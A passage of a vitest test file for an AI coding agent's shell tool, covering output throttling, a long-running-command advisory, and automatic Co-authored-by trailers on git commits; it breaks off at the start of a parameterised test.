        // Settle the execution as aborted so the test cleanly exits.
        resolveExecutionPromise({
          rawOutput: Buffer.from('partial'),
          output: 'partial',
          exitCode: null,
          signal: 15,
          error: null,
          aborted: true,
          pid: 12345,
          executionMethod: 'child_process',
        });
        await promise;

        // Even after settle + further time, no late update.
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS * 2);
        expect(updateOutputMock).toHaveBeenCalledOnce();
      });

      it('should clean up a pending trailing flush if execute() rejects', async () => {
        // ShellExecutionService.execute() can throw before resolving
        // (e.g. PTY dynamic import failure). The tool must propagate the
        // error AND ensure no scheduled timer survives to fire a late
        // updateOutput call after the caller has already seen the error.
        // (No chunks can arrive before execute() resolves, so the timer
        // is never actually scheduled in this path. The contract we
        // verify here is that the abort listener is torn down — which we
        // observe indirectly via "no late update on subsequent abort".)
        const ac = new AbortController();
        mockShellExecutionService.mockImplementationOnce(() => {
          throw new Error('pty-import-failed');
        });

        const invocation = shellTool.build({
          command: 'pty-cmd',
          is_background: false,
        });

        await expect(
          invocation.execute(ac.signal, updateOutputMock),
        ).rejects.toThrow('pty-import-failed');

        // After rejection, aborting must not crash and must not produce
        // any updateOutput calls (no listener leak).
        ac.abort();
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS * 2);
        expect(updateOutputMock).not.toHaveBeenCalled();
      });

      it('should pass ANSI chunks through immediately without throttling', async () => {
        const invocation = shellTool.build({
          command: 'interactive-cmd',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal, updateOutputMock);

        const ansiChunk1: import('../utils/terminalSerializer.js').AnsiOutput =
          [
            [
              {
                text: 'Hello',
                bold: false,
                italic: false,
                dim: false,
                underline: false,
                inverse: false,
                fg: '',
                bg: '',
              },
            ],
          ];
        const ansiChunk2: import('../utils/terminalSerializer.js').AnsiOutput =
          [
            [
              {
                text: 'World',
                bold: false,
                italic: false,
                dim: false,
                underline: false,
                inverse: false,
                fg: '',
                bg: '',
              },
            ],
          ];

        // Both ANSI chunks should fire updateOutput immediately, back-to-back
        mockShellOutputCallback({ type: 'data', chunk: ansiChunk1 });
        mockShellOutputCallback({ type: 'data', chunk: ansiChunk2 });

        expect(updateOutputMock).toHaveBeenCalledTimes(2);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });
        await promise;
      });
    });

    describe('long-running foreground hint', () => {
      // Auto-bg advisory. Threshold = effectiveTimeout / 2 — for the
      // default 120s timeout that's 60_000ms, which the tests below
      // assume. Tests use vi fake timers to drive the wall-clock past
      // the threshold without actually sleeping. Hint must fire on
      // success AND error completions (advice is the same), suppress
      // on user-cancel / timeout / external signal (their own
      // messaging is enough), and never fire on the background path
      // (returns before the threshold by construction).
      //
      // Faking BOTH `Date` and `performance` here — shell.ts uses
      // `performance.now()` (monotonic, NTP-resilient) for the
      // long-run elapsed measurement, so without faking performance
      // the elapsed would always read as "near zero" under
      // `advanceTimersByTimeAsync` and the hint tests would never
      // fire. Date stays faked so that `lastUpdateTime = Date.now()`
      // (streaming throttle) and other Date-based callers in the
      // execute path also stay deterministic.
      beforeEach(() => {
        vi.useFakeTimers({ toFake: ['Date', 'performance'] });
      });
      afterEach(() => {
        vi.useRealTimers();
      });

      it('appends the long-run hint when a foreground command runs ≥ 60s', async () => {
        const invocation = shellTool.build({
          command: 'pytest -q',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal);
        // Advance the wall-clock past the 60s threshold.
        await vi.advanceTimersByTimeAsync(60_000);
        resolveShellExecution({ output: 'all green', exitCode: 0 });
        const result = await promise;
        expect(result.llmContent).toContain(
          'this foreground command ran for 60s',
        );
        expect(result.llmContent).toContain('is_background: true');
        expect(result.llmContent).toContain('/tasks');
      });

      it('appends the hint when a successful foreground command with empty output runs ≥ 60s', async () => {
        // Empty-output success: write-only commands (e.g. `tar czf …`,
        // `cp -r large-dir/`, `dd if=…`) frequently produce no stdout
        // and exit 0. The non-debug `returnDisplayMessage` build leaves
        // the message as `''` in this branch (output empty, exitCode 0,
        // no abort/signal/error), so the hint append is the only thing
        // that ever populates the user-facing TUI line. Pin both that
        // the hint reaches the LLM AND that it surfaces in the user's
        // returnDisplay even when the command produced nothing else to
        // show — the user is the one who waited 60s, they should see
        // the same advisory the agent does.
        const invocation = shellTool.build({
          command: 'write-to-disk.sh',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal);
        await vi.advanceTimersByTimeAsync(65_000);
        resolveShellExecution({ output: '', exitCode: 0 });
        const result = await promise;
        expect(result.llmContent).toContain('foreground command ran for 65s');
        expect(result.returnDisplay).toContain(
          'foreground command ran for 65s',
        );
      });

      it('omits the hint when a foreground command finishes under threshold', async () => {
        const invocation = shellTool.build({
          command: 'echo hi',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal);
        await vi.advanceTimersByTimeAsync(5_000);
        resolveShellExecution({ output: 'hi', exitCode: 0 });
        const result = await promise;
        expect(result.llmContent).not.toContain('foreground command ran for');
        expect(result.llmContent).not.toContain('is_background: true');
      });

      it('appends the hint when a long-running foreground command exits non-zero', async () => {
        // Non-zero exit (without spawn error) is the common "command
        // ran but failed" shape. `ShellExecutionResult.error` is
        // reserved for spawn/setup failures (see the doc on the field
        // in shellExecutionService.ts) — exit-code-N completions leave
        // `error: null` and `exitCode: N`. The agent still got blocked
        // for >60s on something that errored; "next time background
        // it" is exactly the right advice for either failure shape.
        const invocation = shellTool.build({
          command: 'flaky.sh',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal);
        await vi.advanceTimersByTimeAsync(75_000);
        resolveShellExecution({
          output: '',
          exitCode: 1,
          error: null, // realistic shape: non-zero exit, no spawn error
        });
        const result = await promise;
        expect(result.llmContent).toContain('Exit Code: 1');
        expect(result.llmContent).toContain(
          'this foreground command ran for 75s',
        );
      });

      it('omits the hint on aborted commands (timeout / user-cancel paths surface their own messaging)', async () => {
        // `tail -f` (not `sleep N`) so the sleep-interception validator
        // doesn't reject the command at build-time before we even reach
        // the long-run hint logic.
        const invocation = shellTool.build({
          command: 'tail -f /tmp/never.log',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal);
        await vi.advanceTimersByTimeAsync(120_000);
        resolveShellExecution({
          output: '',
          exitCode: null,
          aborted: true,
        });
        const result = await promise;
        expect(result.llmContent).toContain('Command was cancelled');
        expect(result.llmContent).not.toContain('foreground command ran for');
      });

      it('omits the hint on the timeout path (combinedSignal aborted, signal not)', async () => {
        // The plain `aborted: true` resolution above exercises the user-
        // cancel branch (`combinedSignal.aborted && signal.aborted`).
        // The TIMEOUT branch (`combinedSignal.aborted && !signal.aborted`)
        // needs an `AbortSignal.any` mock that returns an already-aborted
        // combined signal — same pattern as `should handle timeout vs
        // user cancellation correctly` further down. Pinning the timeout
        // branch separately so a future regression that flips the
        // suppression check (e.g. `!result.aborted` → `!combinedSignal.aborted`)
        // would fail loudly on this case.
        const userAbort = new AbortController();
        const mockTimeoutSignal = {
          aborted: false,
          addEventListener: vi.fn(),
          removeEventListener: vi.fn(),
        } as unknown as AbortSignal;
        const mockCombinedSignal = {
          aborted: true,
          addEventListener: vi.fn(),
          removeEventListener: vi.fn(),
        } as unknown as AbortSignal;
        const originalAbortSignal = globalThis.AbortSignal;
        vi.stubGlobal('AbortSignal', {
          ...originalAbortSignal,
          timeout: vi.fn().mockReturnValue(mockTimeoutSignal),
          any: vi.fn().mockReturnValue(mockCombinedSignal),
        });

        try {
          const invocation = shellTool.build({
            command: 'tail -f /tmp/never.log',
            is_background: false,
            timeout: 60_000,
          });
          const promise = invocation.execute(userAbort.signal);
          await vi.advanceTimersByTimeAsync(60_000);
          resolveShellExecution({
            output: 'partial',
            exitCode: null,
            aborted: true,
          });
          const result = await promise;

          expect(result.llmContent).toContain(
            'Command timed out after 60000ms',
          );
          expect(result.llmContent).not.toContain('foreground command ran for');
        } finally {
          // Restore even if assertions throw, otherwise globalThis.AbortSignal
          // stays patched and cascades into unrelated subsequent tests.
          vi.stubGlobal('AbortSignal', originalAbortSignal);
        }
      });

      it('omits the hint when the process was killed by an external signal (SIGTERM / OOM / etc.)', async () => {
        // External signals (`result.signal != null`) with `aborted: false`:
        // `shellExecutionService` only sets `aborted` when the AbortSignal
        // we passed was triggered, so SIGTERM from container shutdown,
        // k8s eviction, OOM killer, or a sibling reaping the process group
        // falls through to the non-aborted branch. The advisory shouldn't
        // fire there either — the process didn't run to its conclusion,
        // so "next time, background it" doesn't apply.
        const invocation = shellTool.build({
          command: 'tail -f /tmp/never.log',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal);
        await vi.advanceTimersByTimeAsync(75_000);
        // SIGTERM = 15; ShellExecutionResult stores the numeric signal
        // code (see `signal: number | null` in shellExecutionService.ts
        // and the `os.constants.signals[signal]` lookup at the spawn
        // settle path).
        resolveShellExecution({
          output: '',
          exitCode: null,
          signal: 15,
          aborted: false,
        });
        const result = await promise;
        // Falls through to the normal result formatter (non-aborted).
        expect(result.llmContent).toContain('Signal: 15');
        expect(result.llmContent).not.toContain('foreground command ran for');
      });

      it('off-by-one: omits the hint at threshold − 1ms', async () => {
        // Pin the boundary so a regression that flips `>=` to `>` would
        // fail loudly. Pairs with the existing 60_000ms-exactly test
        // (which fires) — these two together pin the boundary tightly.
        const invocation = shellTool.build({
          command: 'echo hi',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal);
        await vi.advanceTimersByTimeAsync(59_999);
        resolveShellExecution({ output: 'hi', exitCode: 0 });
        const result = await promise;
        expect(result.llmContent).not.toContain('foreground command ran for');
      });

      it('appends the hint AFTER truncation (so it survives `truncateToolOutput`)', async () => {
        // `truncateToolOutput` wraps over-budget output in a "Truncated
        // part of the output:" envelope. If the hint were appended
        // inside that envelope (i.e. before truncation), the LLM might
        // read the advisory as part of the command's own output. Pin
        // the post-truncation insertion order: the hint must appear
        // outside the truncation marker.
        //
        // Mock `truncateToolOutput` directly rather than driving real
        // truncation — the real path needs `fs.writeFile` to actually
        // succeed (the catch fallback returns no `outputFile`, so the
        // shell.ts replacement branch never fires). Mocking here pins
        // ordering, which is all this test cares about.
        const truncationModule = await import('../utils/truncation.js');
        const spy = vi
          .spyOn(truncationModule, 'truncateToolOutput')
          .mockResolvedValue({
            content:
              'Tool output was too large and has been truncated.\n[mocked truncated body]',
            outputFile: '/tmp/qwen-temp/shell_mocked.output',
          });

        try {
          const invocation = shellTool.build({
            command: 'long-output-cmd',
            is_background: false,
          });
          const promise = invocation.execute(mockAbortSignal);
          await vi.advanceTimersByTimeAsync(60_000);
          resolveShellExecution({ output: 'A'.repeat(500), exitCode: 0 });
          const result = await promise;

          const content = result.llmContent as string;
          // Hint present.
          expect(content).toContain('foreground command ran for 60s');
          // Truncation envelope present (proves the truncation branch
          // actually ran in shell.ts — `outputFile` was set so the
          // replacement happened).
          expect(content).toContain(
            'Tool output was too large and has been truncated.',
          );
          // Hint comes AFTER the truncation marker — pins the
          // post-truncation insertion order so a regression that
          // moves the append back inside the non-aborted llmContent
          // builder (where it'd get wrapped by the truncation
          // envelope on long output) would fail loudly.
          const truncIdx = content.indexOf(
            'Tool output was too large and has been truncated.',
          );
          const hintIdx = content.indexOf('foreground command ran for');
          expect(hintIdx).toBeGreaterThan(truncIdx);
        } finally {
          // Restore even if assertions throw — otherwise the
          // truncateToolOutput spy leaks into subsequent tests.
          spy.mockRestore();
        }
      });

      it('threshold scales with the user-supplied timeout (not the default)', async () => {
        // User explicitly sets timeout: 600_000 (10 min) because they
        // expect a long command. Threshold is half that, so a 100s
        // run should NOT trigger the advisory — the user already told
        // us this command is allowed to run long. Pins the per-
        // invocation coupling so a regression that goes back to the
        // fixed `LONG_RUNNING_FOREGROUND_THRESHOLD_MS` constant
        // would fail this test.
        const invocation = shellTool.build({
          command: 'pytest --slow',
          is_background: false,
          timeout: 600_000,
        });
        const promise = invocation.execute(mockAbortSignal);
        await vi.advanceTimersByTimeAsync(100_000); // 100s, well under threshold (300s)
        resolveShellExecution({ output: 'all green', exitCode: 0 });
        const result = await promise;
        expect(result.llmContent).not.toContain('foreground command ran for');
      });

      it('threshold-scaling positive case: hint DOES fire at the scaled threshold', async () => {
        // Pair with the negative test above. If `longRunThresholdFor`
        // regressed to a fixed 60s, the negative test would still pass
        // (no hint at 100s under default threshold either) but THIS
        // one would also fire incorrectly at 100s — pinning both ends
        // catches the failure mode.
        const invocation = shellTool.build({
          command: 'pytest --slow',
          is_background: false,
          timeout: 600_000,
        });
        const promise = invocation.execute(mockAbortSignal);
        await vi.advanceTimersByTimeAsync(305_000); // past 300s scaled threshold
        resolveShellExecution({ output: 'all green', exitCode: 0 });
        const result = await promise;
        expect(result.llmContent).toContain('foreground command ran for 305s');
      });

      it('hint appears in non-debug returnDisplay (user TUI)', async () => {
        // The hint is useful to the user too — they're the one waiting
        // for long commands. Pin that the non-debug TUI gets the hint
        // appended (terse form: result.output + hint, separated by
        // blank line). Default `getDebugMode → false`.
        const invocation = shellTool.build({
          command: 'pytest -q',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal);
        await vi.advanceTimersByTimeAsync(60_000);
        resolveShellExecution({ output: 'all green', exitCode: 0 });
        const result = await promise;
        // Both surfaces have the hint.
        expect(result.llmContent).toContain('foreground command ran for 60s');
        expect(result.returnDisplay).toContain(
          'foreground command ran for 60s',
        );
        // Original output preserved (not replaced by hint).
        expect(result.returnDisplay).toContain('all green');
      });

      it('hint also appears in debug-mode returnDisplay (mirrors LLM view)', async () => {
        // Same hint visibility but through the debug-mode mirror code
        // path. Both branches now use append-style re-sync (preserving
        // any prior content like the truncation marker), so the
        // assertion is the same — but exercising both flips guards
        // the branch from regressing independently.
        const debugMock = mockConfig as unknown as { getDebugMode: Mock };
        debugMock.getDebugMode.mockReturnValue(true);
        try {
          const invocation = shellTool.build({
            command: 'pytest -q',
            is_background: false,
          });
          const promise = invocation.execute(mockAbortSignal);
          await vi.advanceTimersByTimeAsync(60_000);
          resolveShellExecution({ output: 'all green', exitCode: 0 });
          const result = await promise;
          expect(result.llmContent).toContain('foreground command ran for 60s');
          expect(result.returnDisplay).toContain(
            'foreground command ran for 60s',
          );
        } finally {
          debugMock.getDebugMode.mockReturnValue(false);
        }
      });

      it('honors the MIN_LONG_RUN_THRESHOLD_MS floor for pathological tiny timeouts', async () => {
        // `longRunThresholdFor(1)` would otherwise be `Math.floor(0.5) = 0`,
        // making `elapsedMs >= 0` true on every invocation and emitting
        // a "ran for 0s" advisory. The floor at MIN_LONG_RUN_THRESHOLD_MS
        // (1000ms) keeps the threshold sensible. This test pins it: a
        // 500ms run with `timeout: 1` finishes BELOW the floor and must
        // NOT trigger the hint. (The result is mocked with `aborted: false`
        // since we're isolating the threshold logic from the abort path —
        // a regression that strips the `Math.max(...)` guard would fire
        // the hint here while the real-world abort path stays intact.)
        const invocation = shellTool.build({
          command: 'echo done',
          is_background: false,
          timeout: 1,
        });
        const promise = invocation.execute(mockAbortSignal);
        await vi.advanceTimersByTimeAsync(500);
        resolveShellExecution({ output: 'done', exitCode: 0 });
        const result = await promise;
        expect(result.llmContent).not.toContain('foreground command ran for');
      });

      it('hint survives the error path (appended to error.message)', async () => {
        // `coreToolScheduler` builds the model-facing functionResponse
        // from `error.message` (NOT llmContent) when toolResult.error
        // is set. So if a long command fails AND hits the spawn-error
        // path, the hint we appended to llmContent would be silently
        // dropped before reaching the agent. Pin that the hint also
        // lives in error.message.
        //
        // Note on realism: `ShellExecutionResult.error` is reserved for
        // spawn / setup failures (per the field's doc comment in
        // shellExecutionService.ts) — non-zero exits leave it null.
        // Real spawn failures (ENOENT, permission denied) typically
        // resolve in <1s, so the long-elapsed + spawn-error combination
        // tested here is rare in practice. The test still pins the
        // CODE PATH because slow spawn paths exist (PTY init dragging,
        // remote-fs exec syscalls, security scanners interposing) and
        // a future regression that drops the error-path hint
        // preservation would silently break those edge cases.
        const slowSpawnError = new Error('PTY initialization failed after 75s');
        const invocation = shellTool.build({
          command: 'cmd-that-fails-to-spawn',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal);
        await vi.advanceTimersByTimeAsync(75_000);
        resolveShellExecution({
          output: '',
          exitCode: null, // spawn never produced an exit code
          error: slowSpawnError,
        });
        const result = await promise;
        // The hint must appear in the error.message path so the LLM
        // sees it via the scheduler's error branch.
        expect(result.error?.message).toContain(
          'PTY initialization failed after 75s',
        );
        expect(result.error?.message).toContain(
          'foreground command ran for 75s',
        );
        // `\n---\n` divider so downstream consumers
        // (firePostToolUseFailureHook, telemetry grouping, SIEM, hook
        // parsers) have an unambiguous boundary between the original
        // error body and the appended advisory. Without the divider,
        // pattern-matching on error messages would absorb the ~400-
        // char advisory into the matched body.
        expect(result.error?.message).toMatch(
          /PTY initialization failed after 75s\n\n---\n/,
        );
      });

      it('never appends the long-run hint on background commands', async () => {
        // Background path returns immediately with `Background shell
        // started.` and a different result shape — by construction the
        // hint logic only lives in `executeForeground`, so this can't
        // fail today. Defensive pin: a future refactor that hoists the
        // long-run advisory into a shared post-execute path would
        // accidentally tag every background launch with a "ran for 0s,
        // consider is_background: true" suggestion (nonsense — it's
        // already backgrounded). This test fails loudly on that
        // regression.
        const invocation = shellTool.build({
          command: 'pytest -q',
          is_background: true,
        });
        const result = await invocation.execute(mockAbortSignal);
        expect(result.llmContent).toContain('Background shell started');
        expect(result.llmContent).not.toContain('foreground command ran for');
        // The hint text contains the literal `is_background: true` —
        // the background path's own llmContent doesn't, so this guards
        // against the hint leaking in via a shared code path.
        expect(result.llmContent).not.toContain('is_background: true');
      });
    });

    describe('addCoAuthorToGitCommit', () => {
      it('should add co-author to git commit with double quotes', async () => {
        const command = 'git commit -m "Initial commit"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        // Mock the shell execution to return success
        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        // Verify that the command was executed with co-author added
        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining(
            'Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>',
          ),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      it('should add co-author to git commit with single quotes', async () => {
        const command = "git commit -m 'Fix bug'";
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining(
            'Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>',
          ),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      it('should handle git commit with additional flags', async () => {
        const command = 'git commit -a -m "Add feature"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining(
            'Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>',
          ),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      it('should handle git commit with combined short flags like -am', async () => {
        const command = 'git commit -am "Add feature"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining(
            'Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>',
          ),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      it('should not modify non-git commands', async () => {
        const command = 'npm install';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining('npm install'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      it('should not modify git commands without -m flag', async () => {
        const command = 'git commit';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining('git commit'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      it('should handle git commit with escaped quotes in message', async () => {
        const command = 'git commit -m "Fix \\"quoted\\" text"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining(
            'Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>',
          ),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      it('should not add co-author when only pr is enabled (commit off)', async () => {
        // Commit attribution must be independent from PR attribution:
        // disabling commit should skip the Co-authored-by trailer even if
        // pr remains enabled.
        (mockConfig.getGitCoAuthor as Mock).mockReturnValue({
          commit: false,
          pr: true,
          name: 'Qwen-Coder',
          email: 'qwen-coder@alibabacloud.com',
        });

        const command = 'git commit -m "Initial commit"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.not.stringContaining('Co-authored-by:'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      it('should not add co-author when disabled in config', async () => {
        // Mock config with commit co-author disabled
        (mockConfig.getGitCoAuthor as Mock).mockReturnValue({
          commit: false,
          pr: false,
          name: 'Qwen-Coder',
          email: 'qwen-coder@alibabacloud.com',
        });

        const command = 'git commit -m "Initial commit"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining('git commit -m "Initial commit"'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      it('should use custom name and email from config', async () => {
        // Mock config with custom co-author details
        (mockConfig.getGitCoAuthor as Mock).mockReturnValue({
          commit: true,
          pr: true,
          name: 'Custom Bot',
          email: 'custom@example.com',
        });

        const command = 'git commit -m "Test commit"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining(
            'Co-authored-by: Custom Bot <custom@example.com>',
          ),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // `cd /elsewhere && git commit` could be redirecting the commit
      // into a different repo than our cwd. We can't take a meaningful
      // pre-HEAD snapshot or write notes to the right place without
      // resolving the cd target, so we conservatively skip the
      // co-author rewrite altogether.
      it('should NOT add co-author when git commit is preceded by cd', async () => {
        const command = 'cd /tmp/test && git commit -m "Test commit"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.not.stringContaining('Co-authored-by:'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // `cd subdir && git commit` (relative cd that doesn't escape
      // upward) is a very common workflow — entering a subdirectory
      // before committing. The cd target stays inside the same repo,
      // so attribution should still apply. The earlier blanket
      // "any cd shifts cwd" gate broke this; the heuristic now only
      // marks shifted on absolute paths, `..`-prefixed paths, env-var
      // expansions, etc.
      it('should add co-author for cd subdir && git commit (relative same-repo)', async () => {
        const command = 'cd src && git commit -m "Test commit"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining('Co-authored-by:'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // `cd ..` could escape the repo root — conservative shift.
      // Embedded `..` traversal — `cd foo/../../escape` — could
      // escape the repo just as much as a leading `..`, so the
      // heuristic must reject it. Without this the trailer would
      // be appended to a commit landing in a different repo.
      it('should NOT add co-author for cd with embedded .. (escapes via traversal)', async () => {
        const command = 'cd foo/../../escape && git commit -m "Test"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.not.stringContaining('Co-authored-by:'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // `env` is a shell wrapper like `sudo`/`command`, with the
      // additional twist that it accepts `KEY=VALUE` argv entries
      // before the program. Without explicit handling, the regex
      // would see `KEY=VALUE` as the program name and skip
      // attribution entirely.
      it('should add co-author when git commit is wrapped in env KEY=VAL', async () => {
        const command =
          'env GIT_COMMITTER_DATE=now git commit -m "Test commit"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining('Co-authored-by:'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // `env -u NAME` unsets a variable. The flag takes a value, so
      // tokeniseSegment has to skip it; otherwise NAME would be left
      // as the next token and the parser would treat it as the
      // program, masking the real `git commit`.
      it('should add co-author when git commit is wrapped in env -u NAME', async () => {
        const command = 'env -u GIT_AUTHOR_DATE git commit -m "Test commit"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining('Co-authored-by:'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // `GIT_DIR=...` and friends redirect git's repo selection; a
      // commit prefixed with one of these lands in a different repo
      // than our cwd. Stamping the trailer onto it would corrupt a
      // commit in a repo the user didn't expect us to touch.
      it.each([
